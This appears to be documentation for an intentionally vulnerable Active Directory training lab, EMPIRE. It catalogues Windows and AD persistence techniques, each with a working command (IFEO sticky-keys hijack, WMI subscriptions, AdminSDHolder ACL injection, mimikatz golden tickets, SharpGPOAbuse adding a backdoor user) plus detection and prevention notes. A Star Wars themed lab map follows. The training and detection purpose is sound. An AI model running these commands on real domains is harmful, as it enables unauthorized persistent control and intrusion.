# 06 — Persistence (PER-001..037)

Persistence = "stay after credentials change, after reboot, after the IR team thinking they've cleaned up." EMPIRE has every common Windows + AD persistence primitive wired up — the lab is for *practicing detection* as much as offense.

---

### Persistence Vectors Mapping

```mermaid
graph LR
    classDef user fill:#1d2b38,stroke:#00d2ff,stroke-width:2px,color:#fff;
    classDef group fill:#3a1d38,stroke:#ff00d2,stroke-width:2px,color:#fff;
    classDef object fill:#333333,stroke:#aaaaaa,stroke-width:2px,color:#fff;

    Steve[steve.rogers]:::user -->|GenericAll| AdminSD[AdminSDHolder]:::object
    AdminSD -.->|SDProp / FullControl| DA[Domain Admins]:::group
```

---

### PER-001 — Registry Run Keys
**What it is:** `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` (or `HKCU`) → executable runs on every logon.
**Tools:** `reg add`, `Set-ItemProperty`.
**Steps:**
```cmd
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\Temp\b.exe"
```
**Detection:** Sysmon `13` registry-set in Run keys; AutoRuns scan.
**Prevention:** AppLocker; constrained language mode; user can't write HKLM Run.

---

### PER-002 — IFEO Debugger
**What it is:** `Image File Execution Options\<exe>\Debugger=C:\Temp\b.exe` — every time `<exe>` runs, `b.exe` runs in its place with `<exe>` as arg.
**Tools:** `reg add`.
**Steps:**
```cmd
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "cmd.exe"
```
**Detection:** Sysmon `13` writes under IFEO.
**Prevention:** restrict HKLM write; monitor IFEO writes.

---

### PER-003 — Startup Folder
**What it is:** Attacker drops a malicious executable or script (e.g., a batch file or `.lnk` shortcut) into the Startup folder of a specific user or the global "All Users" startup directory (`C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\`). When a user logs in, Windows automatically executes the contents of this folder.
**Tools:** Command line, PowerShell.
**Steps:**
```cmd
echo @echo off > "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\updater.bat"
echo echo PER-003-startup-persistence ^> C:\Flags\FLAG-PER-003-Startup.txt >> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\updater.bat"
```
**Detection:** Sysmon Event ID `11` (FileCreate) targeting the StartUp directories; Autoruns scan detecting new items in startup.
**Prevention:** Enforce strict ACLs on `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` to prevent non-admins from writing to it; application control/AppLocker to restrict execution from startup directories.

---

### PER-004 — Scheduled Task
**What it is:** Creating a scheduled task that executes a payload under the `SYSTEM` context (or as another user). In the lab, a task named `SynchTask` is registered to run at logon and daily at 03:00.
**Tools:** `schtasks.exe`, PowerShell.
**Steps:**
```powershell
$action  = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c echo PER-004-persistence > C:\Flags\FLAG-PER-004-Schtask.txt'
$trigger = @((New-ScheduledTaskTrigger -AtLogOn), (New-ScheduledTaskTrigger -Daily -At '03:00'))
$principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
$settings  = New-ScheduledTaskSettingsSet -Hidden
Register-ScheduledTask -TaskName 'SynchTask' -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description 'PER-004: Attacker scheduled task' -Force
```
**Detection:** Event ID `4698` (A scheduled task was created); Sysmon Event ID `1` (Process Creation) for `schtasks.exe` or executing tasks.
**Prevention:** Restrict task creation permissions; baseline scheduled tasks; limit local admin permissions.

---

### PER-005 — COM Hijacking
**What it is:** Hijacking COM object loading. When a program requests a CLSID, Windows looks in `HKCU\Software\Classes\CLSID` before `HKLM\SOFTWARE\Classes\CLSID`. By putting a malicious DLL path under the target user's registry hive (or HKLM for system-wide hijack) for a CLSID like `{BCDE0395-E52F-467C-8E3D-C4579291692E}` (MMDeviceEnumerator), any app loading this COM object will execute the attacker's DLL.
**Tools:** `reg add`, ProcMon.
**Steps:**
```cmd
reg add "HKLM\SOFTWARE\Classes\CLSID\{BCDE0395-E52F-467C-8E3D-C4579291692E}\InProcServer32" /ve /t REG_SZ /d "C:\Tools\dvad_com.dll" /f
```
**Detection:** Sysmon Event ID `12` or `13` registry modifications in CLSID keys; loading of unsigned DLLs by common processes (Sysmon Event ID `7`).
**Prevention:** Restrict write permissions to COM registry paths; audit CLSID configuration changes.

---

### PER-006 — WMI Event Subscription
**What it is:** `__EventFilter` + `CommandLineEventConsumer` + `__FilterToConsumerBinding` → fires on a WQL condition (e.g. every 60s) → SYSTEM. Fileless.
**Tools:** `wmic`, `PowerSploit Install-EventSubscription`.
**Steps:**
```powershell
$f = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name='evil';EventNameSpace='root\cimv2';QueryLanguage='WQL';Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}
$c = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='evil';CommandLineTemplate='cmd.exe /c C:\Temp\b.exe'}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$f;Consumer=$c}
```
**Detection:** Event `5861` WMI permanent subscription created.
**Prevention:** alert on every `5861`; baseline subscriptions; remove unknown ones.

---

### PER-007 — Netsh Helper DLL
**What it is:** `netsh add helper evil.dll` — DLL loaded each time `netsh` runs.
**Tools:** custom DLL.
**Detection:** Sysmon `13` `HKLM\Software\Microsoft\Netsh\<name>`.
**Prevention:** monitor netsh helpers; block writes to that key.

---

### PER-008 — COM Hijacking (TreatAs / ProgID)
**What it is:** HKCU COM keys take precedence over HKLM. Redirect a common CLSID → your DLL → every COM-using app loads it.
**Tools:** `Invoke-ATTACKAPI`, custom DLL.
**Steps:**
```reg
[HKCU\Software\Classes\CLSID\{0E5AAE11-A475-4C5B-AB00-C66DE400274E}\InprocServer32]
@="C:\\Temp\\evil.dll"
```
**Detection:** Sysmon `7` non-MS DLL loaded into common processes; HKCU CLSID writes.
**Prevention:** enable "Always check the registry for the latest version of a COM object" off; AppLocker DLL rules.

---

### PER-009 — Authentication Package (mimilib)
**What it is:** see CRED-038 + PER-024.

---

### PER-010 — Time Providers (W32Time)
**What it is:** `HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\<x>` registers a DLL loaded by the W32Time service (SYSTEM).
**Detection:** Sysmon `13` on those subkeys.
**Prevention:** monitor; FIM on `w32time.dll` DLL siblings.

---

### PER-011 — BootExecute
**What it is:** `HKLM\System\CurrentControlSet\Control\Session Manager\BootExecute` runs before everything else.
**Detection:** registry monitoring.
**Prevention:** FIM on that key.

---

### PER-012 — AppInit_DLLs
**What it is:** `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs` — DLLs loaded into every GUI process. Mostly disabled on modern Windows when secure boot is on.
**Detection:** monitor `LoadAppInit_DLLs` / `RequireSignedAppInit_DLLs` registry.
**Prevention:** `LoadAppInit_DLLs=0`; secure boot.

---

### PER-013 — Accessibility Tools
See PER-003 — same idea, all accessibility tools (Magnifier, OnScreenKeyboard, NarratorEC).

---

### PER-014 — RID Hijacking
See CRED-043.

---

### PER-015 — AdminSDHolder ACL injection
**What it is:** add ACE to `CN=AdminSDHolder,CN=System,DC=empire,DC=local`. SDProp re-applies the AdminSDHolder ACL every 60 minutes to every protected object (Domain Admins, Enterprise Admins, etc.). Self-healing backdoor — even if removed, returns within the hour.
**Why it works here:** GenericAll injected for `steve.rogers` in EMPIRE.
**Tools:** PowerView `Add-DomainObjectAcl -TargetIdentity AdminSDHolder -PrincipalIdentity steve.rogers -Rights All`.
**Steps:**
```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=empire,DC=local' \
   -PrincipalIdentity steve.rogers -Rights All
```
**Detection:** Event `5136` on AdminSDHolder; MDI native alert.
**Prevention:** alert on any change to AdminSDHolder; tier-0 isolation; PIM.

---

### PER-016 — SID History Injection
**What it is:** set `sIDHistory` on an attacker account to include privileged SIDs (Domain Admins 512, Enterprise Admins 519). Kerberos PAC carries them → effective admin.
**Tools:** mimikatz `sid::patch` + `sid::add`, DCShadow.
**Steps:**
```powershell
.\mimikatz.exe "sid::patch" "sid::add /sam:loki /new:S-1-5-21-EMPIRE-519"
```
**Detection:** MDI "SID-History suspicious activity."
**Prevention:** Quarantine attribute; PowerShell `Get-ADUser -Filter * -Properties sIDHistory | ?{$_.sIDHistory}` audit; SIDHistory should be empty in modern domains.

---

### PER-017 — Service Binary
**What it is:** Planting a malicious service binary or exploiting an unquoted service path. When a service executes, it runs under `SYSTEM` privileges. If the service binary path contains spaces and is unquoted (e.g., `C:\Program Files\DVAD Service\dvad_svc.exe`), Windows will attempt to execute `C:\Program.exe` or `C:\Program Files\DVAD.exe` before the actual path.
**Tools:** `sc.exe`, `icacls`, `PowerUp.ps1`.
**Steps:**
```cmd
# Create service with unquoted path:
sc.exe create dvad_svc binPath= "C:\Program Files\DVAD Service\dvad_svc.exe" start= auto type= own
sc.exe description dvad_svc "PER-017: Persistence service — unquoted path in C:\Program Files"
```
**Detection:** Event ID `7045` (A new service was installed); monitoring registry writes under `HKLM\SYSTEM\CurrentControlSet\Services\`; Sysmon Event ID `11` for file creations in restricted folders.
**Prevention:** Ensure all service paths are enclosed in quotes; restrict write permissions to root directories and Program Files.

---

### PER-018 — Golden Ticket
**What it is:** forge a TGT with the krbtgt NT hash. Lasts until krbtgt is reset *twice*.
**Why it works here:** krbtgt set deterministically to `KrbtgtEmpire2024!`.
**Tools:** `mimikatz kerberos::golden`, `impacket-ticketer`.
**Steps:**
```powershell
.\mimikatz.exe "kerberos::golden /domain:empire.local /sid:S-1-5-21-... /user:Administrator /krbtgt:HASH /ptt"
```
```bash
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain empire.local Administrator
```
**Detection:** Event `4769` TGS with no preceding `4768` (TGT issued); abnormal account-creation time in PAC; MDI "Suspected Golden Ticket usage."
**Prevention:** **rotate krbtgt twice** with the official script after compromise; tier-0 hygiene.

---

### PER-019 — DLL Search Order
**What it is:** Windows searches for DLLs in a specific order: the application's directory, the system directories, and the directories in the system `PATH` environment variable. By placing a world-writable directory (like `C:\Tools`) at the head of the system `PATH`, any process that attempts to load a DLL that isn't present in prior search locations will load the malicious DLL from `C:\Tools` instead.
**Tools:** `icacls`, `Set-ItemProperty`.
**Steps:**
```powershell
# Prepend C:\Tools to system PATH
$oldPath = [Environment]::GetEnvironmentVariable('Path', 'Machine')
[Environment]::SetEnvironmentVariable('Path', "C:\Tools;$oldPath", 'Machine')
# Set world-writable permission on C:\Tools
icacls "C:\Tools" /grant "Everyone:(OI)(CI)(F)"
```
**Detection:** Sysmon Event ID `7` (Image loaded) where a common system process loads a DLL from an unusual path (e.g., `C:\Tools\`).
**Prevention:** Do not add user-writable folders to the system `PATH` environment variable; keep `SafeDllSearchMode` enabled.

---

### PER-020 — IFEO Debugger
**What it is:** Image File Execution Options (IFEO) let developers debug applications by specifying a debugger to run when the target executable is launched. By creating a `Debugger` registry value for a binary like `sethc.exe` or `utilman.exe` pointing to `cmd.exe`, an attacker can launch `cmd.exe` as `SYSTEM` from the Windows login screen by pressing Shift five times (Sticky Keys) or pressing Windows Key + U (Utilman).
**Tools:** `reg add`.
**Steps:**
```cmd
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "cmd.exe" /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /t REG_SZ /d "cmd.exe" /f
```
**Detection:** Sysmon Event ID `13` (Registry value set) targeting the `Image File Execution Options` registry key; Event ID `4688` (Process Creation) where `cmd.exe` has `sethc.exe` or `utilman.exe` as parent.
**Prevention:** Restrict write permissions to the HKLM IFEO registry path; disable accessibility tools on the lock screen.

---

### PER-021 — AppInit_DLLs
**What it is:** The `AppInit_DLLs` registry key allows custom DLLs to be loaded into the address space of every interactive process that links with `user32.dll` at startup. This provides system-wide DLL injection.
**Tools:** `reg add`.
**Steps:**
```cmd
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\Tools\dvad_appinit.dll" /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f
```
**Detection:** Monitoring registry value changes in `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs`; Sysmon Event ID `7` (Image loaded) showing unexpected DLLs loaded into processes.
**Prevention:** Enable Secure Boot (which disables AppInit DLLs); set `LoadAppInit_DLLs` to `0` and restrict registry write permissions.

---

### PER-022 — Winlogon Helper
**What it is:** The Windows logon process (`winlogon.exe`) reads registry values like `Userinit` and `Shell` to start the user environment. Attackers can append their malicious executable (e.g., `dvad_winlogon.exe`) to the comma-separated `Userinit` string, so that it runs every time a user logs in.
**Tools:** `reg add`.
**Steps:**
```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\Windows\dvad_winlogon.exe" /f
```
**Detection:** Sysmon Event ID `13` targeting the `Winlogon` registry key; Event ID `4688` for processes launched by `winlogon.exe`.
**Prevention:** Monitor and enforce integrity of the `Userinit` and `Shell` registry values; restrict write access to the Winlogon registry key.

---

### PER-023 — Time Provider
**What it is:** The Windows Time service (`W32Time`) uses time providers to synchronize time. These are registered in the registry, and their DLLs are loaded into the service process (`svchost.exe` running as `SYSTEM`) at service start. By adding a custom time provider pointing to a malicious DLL, the attacker gains system-level persistence.
**Tools:** `reg add`.
**Steps:**
```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\dvad_time" /v DllName /t REG_SZ /d "C:\Tools\dvad_time.dll" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\dvad_time" /v Enabled /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\dvad_time" /v InputProvider /t REG_DWORD /d 1 /f
```
**Detection:** Sysmon Event ID `13` targeting `W32Time\TimeProviders`; `W32Time` service starting and loading an unsigned or untrusted DLL.
**Prevention:** Restrict write access to `HKLM\SYSTEM\CurrentControlSet\Services\W32Time\`; monitor loaded modules in `svchost.exe`.

---

### PER-024 — Custom SSP (memssp/mimilib)
See CRED-038.

---

### PER-025 — DSRM Backdoor
**What it is:** set `DsrmAdminLogonBehavior=2` on a DC → the DSRM (Directory Services Restore Mode) account can be used for *network* logon with its hash. PtH directly to DC.
**Tools:** mimikatz `lsadump::sam`, registry edit.
**Steps:**
```cmd
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2
```
**Detection:** registry change to DsrmAdminLogonBehavior; Event `4624` Logon Type 3 with DSRM account.
**Prevention:** never enable network logon for DSRM; rotate DSRM passwords; FIM.

---

### PER-026 — Auth Package Persistence
See PER-009 / CRED-038.

---

### PER-027 — KeyCredentialLink Self-Shadow
**What it is:** GenericWrite on your own account → add a persistent device key to `msDS-KeyCredentialLink` → PKINIT auth forever even if password changes.
**Tools:** `pyWhisker`, `Certipy shadow`.
**Steps:**
```bash
certipy shadow auto -u peter.parker -p 'EmpireLab2024!' -account peter.parker
```
**Detection:** Event `5136` on `msDS-KeyCredentialLink` (self).
**Prevention:** restrict self-write on `msDS-KeyCredentialLink`; KB5014754 strict mapping.

---

### PER-028 — gMSA Backdoor
**What it is:** DA adds attacker to `PrincipalsAllowedToRetrieveManagedPassword` on a privileged gMSA → read at will, no log trail.
**Detection:** Event `5136` on the attribute.
**Prevention:** alert on gMSA delegation changes.

---

### PER-029 — RBCD Persistence on DC
**What it is:** DA sets `msDS-AllowedToActOnBehalfOfOtherIdentity` on a DC$ object for an attacker-owned machine → S4U → DA whenever.
**Detection:** Event `5136` on DC object.
**Prevention:** lock down RBCD writes on DCs.

---

### PER-030 — ADIDNS Time Bomb
**What it is:** pre-register DNS names you predict will exist later (`new-fileserver.empire.local`) → first-auth MITM.
**Detection:** ADIDNS write monitoring.
**Prevention:** restrict ADIDNS create.

---

### PER-031 — GPO Boot Script
**What it is:** Group Policy Objects (GPOs) allow administrators to configure startup/shutdown scripts that run on computers. An attacker can hijack GPO settings or directly inject a script into the registry or SYSVOL path of a linked GPO, running code as `SYSTEM` on all targeted systems at boot time.
**Tools:** `reg add`, ActiveDirectory module.
**Steps:**
```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup\0\0" /v Script /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup\0\0" /v Parameters /t REG_SZ /d "/c echo GPO-Script-Running > C:\Flags\FLAG-PER-031-GPO.txt" /f
```
**Detection:** Event ID `5136` (A directory service object was modified) on GPO objects; Sysmon Event ID `11` for writes to `SYSVOL` policy scripts; Event ID `4688` for process launches by `gpscript.exe`.
**Prevention:** Strictly restrict delegation permissions on GPOs (e.g., GPO Creator Owners); monitor modifications to policy templates in SYSVOL.

---

### PER-032 — Hidden Account via Confidentiality Flag
**What it is:** set object's security descriptor so it doesn't appear in normal enumeration (`ms-DS-Other-Settings` / DontShowInDirectory variants).
**Detection:** schema/object metadata audit.
**Prevention:** baseline AD object list; deviation = alert.

---

### PER-033 — AdminSDHolder ACL Injection
See PER-015.

---

### PER-034 — GPO Backdoor
**What it is:** edit a GPO linked to a broad OU → add startup script / scheduled task → code on every machine in OU.
**Tools:** `SharpGPOAbuse`, `New-GPOImmediateTask`.
**Steps:**
```powershell
.\SharpGPOAbuse.exe --AddComputerTask --TaskName Updater --Author 'NT AUTHORITY\SYSTEM' \
   --Command "cmd.exe" --Arguments "/c net user evil P@ss /add" --GPOName 'Default Domain Policy'
```
**Detection:** Event `5136` modifying GPO; SYSVOL writes.
**Prevention:** restrict GPO editors; alert on GPO change; tier-0 isolation.

---

### PER-035 — RODC Compromise Persistence
**What it is:** RODC admin can add accounts to `msDS-RevealOnDemandGroup` → their passwords get cached on RODC permanently.
**Detection:** Event `4742` on RODC object; `msDS-RevealedList` audit.
**Prevention:** RODC scope strictly limited; don't grant RODC admin loosely.

---

### PER-036 — MachineAccountQuota = 10 Backdoor
**What it is:** even without privileges, any domain user can create up to 10 computer accounts. They're attacker-controlled (you have the password). Use for RBCD, Shadow Creds, Silver Tickets.
**Detection:** Event `4741` (computer created) by non-admin.
**Prevention:** `MachineAccountQuota=0`.

---

### PER-037 — Service Account with TRUSTED_FOR_DELEGATION
**What it is:** DA creates a service account with unconstrained delegation as a long-term coercion landing pad.
**Detection:** Event `5136` adding `TRUSTED_FOR_DELEGATION` flag.
**Prevention:** disallow unconstrained delegation on accounts; alert on `userAccountControl` changes adding that bit.

---

Next: [`07-forest-compromise.md`](07-forest-compromise.md).

---

# The EMPIRE AD Lab: Star Wars Lore & Thematic Mapping

Welcome to the **EMPIRE AD Lab**, where the intricacies of Active Directory align with the galactic struggle between the Galactic Empire, the Rebel Alliance, and the shadow syndicates. This section provides a conceptual thematic mapping between the AD concepts you are attacking and the Star Wars universe.

## The Galactic Topology

The lab topology represents the political structure of the galaxy. Just as trust relationships govern AD, diplomatic and military alliances govern the galaxy.

```mermaid
graph TD
    classDef empire fill:#000000,stroke:#ff0000,stroke-width:2px,color:#fff;
    classDef rebel fill:#2b5c8f,stroke:#ff9900,stroke-width:2px,color:#fff;
    classDef trade fill:#4a4a4a,stroke:#aaaaaa,stroke-width:2px,color:#fff;
    classDef highlight fill:#440000,stroke:#ff0000,stroke-width:3px,color:#fff;

    subgraph The Galactic Empire (empire.local)
        Coruscant["Coruscant (Root DC)<br/>coruscant.empire.local"]:::empire
        DeathStar["The Death Star (Child DC)<br/>deathstar.eu.empire.local"]:::highlight
        Scarif["Scarif Citadel (File Server)<br/>scarif.empire.local"]:::empire
        Kamino["Kamino Cloning Facility (SQL)<br/>kamino.empire.local"]:::empire
        Endor["Endor Shield Generator (CA)<br/>endor.empire.local"]:::empire
        Mandalore["Mandalore Mercenary Base (Linux)<br/>mandalore.empire.local"]:::empire
        Coruscant -- "Imperial Command" --> DeathStar
        Coruscant --- Scarif
        Coruscant --- Kamino
        Coruscant --- Endor
        Coruscant --- Mandalore
    end

    subgraph The Rebel Alliance (rebel.local)
        Yavin4["Yavin 4 Base<br/>yavin4.rebel.local"]:::rebel
    end

    subgraph The Trade Federation (trade.corp)
        Neimoidia["Cato Neimoidia<br/>neimoidia.trade.corp"]:::trade
    end

    Coruscant <-->|Espionage / External Trust| Yavin4
    Coruscant <-->|Treaty / Forest Trust| Neimoidia
```

## Infrastructure Mapping

Understanding the infrastructure is key to successfully executing your attack paths. Here is how the technical components of the EMPIRE AD lab map to the Star Wars universe:

### 1. The Core Domains
* **`empire.local` (The Galactic Empire):** The central root domain. This is the seat of the Emperor and the Imperial Senate. Taking over this domain is equivalent to taking over Coruscant. It controls all the core infrastructure.
* **`eu.empire.local` (The Death Star):** A child domain of `empire.local`. While it reports to the root domain, it holds immense power. Escaping the child domain to compromise the root domain is the equivalent of using the Death Star plans to destroy the Empire.
* **`rebel.local` (The Rebel Alliance):** An external forest. It has an external trust with the Empire (perhaps through espionage or captured spies). Moving laterally across this trust requires finding a weak link in the Rebel defenses.
* **`trade.corp` (The Trade Federation):** A separate forest with a bidirectional forest trust. The Empire uses them for resources, but you can forge trust tickets (Inter-Realm TGTs) to cross this boundary.

### 2. High-Value Targets (Servers)
* **`coruscant.empire.local` (Coruscant Root DC):** The ultimate prize. Achieving Domain Admin here gives you the keys to the galaxy.
* **`endor.empire.local` (Endor Shield Generator / ADCS):** Active Directory Certificate Services. If you can compromise the CA (via ESC1, ESC8, etc.), you can forge certificates for any user in the Empire, effectively bringing down the deflector shields.
* **`scarif.empire.local` (Scarif Citadel):** This file server hosts critical SMB shares. It is the repository of the Death Star plans. Look for exposed passwords in scripts or configuration files left by careless Imperial engineers.
* **`kamino.empire.local` (Kamino Facility):** The SQL Server. SQL injection or xp_cmdshell here can lead to a foothold. It represents the cloning facilities—a hidden source of power.
* **`mandalore.empire.local` (Mandalore Base):** The Linux-in-AD member. Contains local privilege escalations and cross-OS pivot opportunities. Represents the mercenary faction employed by the Empire.

### 3. Attack Paths and Tactics
* **Initial Access (The Smuggler's Route):** Finding an exposed SMB share or exploiting an LLMNR poisoning vulnerability (Responder) is like slipping past the Imperial blockade.
* **Kerberoasting (Bounty Hunting):** Requesting TGS tickets for service accounts and cracking them offline is like putting a bounty on a high-value target and cracking their encryption.
* **DCSync (The Force):** Using `secretsdump` to pull the `krbtgt` hash directly from the Domain Controller. It's an invisible, powerful attack that bypasses normal defenses.
* **Golden Ticket (Order 66):** Once you have the `krbtgt` hash, you can forge a TGT for any user, granting you infinite access. It is the ultimate executive order, overriding all security protocols.
* **Trust Abuse (Diplomatic Immunity):** Forging a trust ticket to cross from the Child Domain to the Root Domain.

## The Hacker's Code (Sith vs Jedi)
As you navigate the lab, remember that the tools you use define your path. Will you use noisy, aggressive tools (The Dark Side) that trigger every alarm, or will you use stealthy, precise tradecraft (The Light Side) to move undetected?

* **The Dark Side (Noisy):** Running `BloodHound` with all collection methods, spraying passwords across the entire domain, and dropping standard Mimikatz binaries to disk. It is powerful and fast, but leaves a massive trail.
* **The Light Side (Stealthy):** Targeted LDAP queries, memory-only execution via Covenant or Cobalt Strike, and careful evasion of logging (AMSI bypasses, ETW patching).

## Flag Locations (Holocrons)
Hidden throughout the EMPIRE AD lab are flags (Holocrons) that prove your mastery over the environment. Look for `FLAG-*.txt` files on desktops, hidden SMB shares, and within the SQL databases. 

**Remember:** 
* "Your focus determines your reality." - Qui-Gon Jinn. Focus on the attack paths mapped out in `PLAN.md`.
* "I find your lack of faith disturbing." - Darth Vader. If an exploit fails, check your syntax, your targeting, and the underlying misconfiguration. The lab is intentionally vulnerable.

May the Force be with you as you conquer the EMPIRE AD!
